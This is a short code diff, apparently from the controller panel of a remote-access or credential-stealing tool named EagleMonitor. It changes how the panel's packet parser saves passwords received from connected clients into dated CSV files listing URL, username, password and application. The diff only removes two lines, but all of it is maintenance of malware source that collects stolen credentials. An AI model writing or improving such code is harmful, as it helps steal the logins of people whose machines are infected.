@@ -53,12 +53,10 @@ namespace EagleMonitor.PacketParser
                             Miscellaneous.ToCSV(clientHandler.passwordsForm.dataGridView1, clientHandler.clientPath + "\\Passwords\\" + Utils.Miscellaneous.DateFormater() + ".csv");
                             clientHandler.passwordsForm.loadingCircle1.Visible = false;
                             clientHandler.passwordsForm.loadingCircle1.Active = false;
-                            passwordsPacket = null;
                         }));
                     }
                     else
                     { Miscellaneous.ToCSV(passwordsPacket.passwordsList, clientHandler.clientPath + "\\Passwords\\" + Utils.Miscellaneous.DateFormater() + ".csv", new string[] { "URL", "Username", "Password", "Application" }); }
-                    return;
                 }
                 catch { Miscellaneous.ToCSV(passwordsPacket.passwordsList, clientHandler.clientPath + "\\Passwords\\" + Utils.Miscellaneous.DateFormater() + ".csv", new string[] { "URL", "Username", "Password", "Application" }); }
             }).Start();
